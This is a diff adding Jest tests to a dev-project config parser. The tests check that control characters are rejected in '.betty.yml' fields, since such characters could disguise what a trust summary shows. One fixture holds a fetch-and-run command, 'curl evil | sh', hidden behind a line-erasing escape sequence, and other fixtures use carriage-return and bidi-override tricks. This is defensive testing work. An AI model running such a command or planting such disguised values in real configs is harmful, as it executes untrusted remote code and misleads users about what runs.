@@ -193,6 +193,22 @@ describe('readDevProjectConfig', () => {
     expect(config.permissions?.docker).toBe('allowed')
   })
 
+  test.each([
+    ['an escape sequence in the up command', SAMPLE_CONFIG.replace('docker compose up -d', '"curl evil | sh #\\e[2K\\r  npm run dev"'), 'up.command'],
+    ['a carriage return in the project name', SAMPLE_CONFIG.replace('project: mckanses-auth', 'project: "shop\\rok"'), 'project'],
+    ['a bidi override in a target', SAMPLE_CONFIG.replace('http://127.0.0.1:5173', '"http://127.0.0.1:5173/\\u202e"'), 'domains[0].target'],
+  ])('rejects %s, which could disguise what the trust summary shows', (_what, content, label) => {
+    ;(fs.readFileSync as unknown as jest.Mock).mockReturnValue(content)
+
+    expect(() => readDevProjectConfig('/project/.betty.yml')).toThrow(`.betty.yml: ${label} contains control characters.`)
+  })
+
+  test('accepts an up command over several lines', () => {
+    ;(fs.readFileSync as unknown as jest.Mock).mockReturnValue(SAMPLE_CONFIG.replace('  command: docker compose up -d', '  command: |\n    npm ci\n    npm run dev'))
+
+    expect(readDevProjectConfig('/project/.betty.yml').up?.command).toBe('npm ci\nnpm run dev')
+  })
+
   test('rejects non-http targets', () => {
     ;(fs.readFileSync as unknown as jest.Mock).mockReturnValue([
       'project: bad',
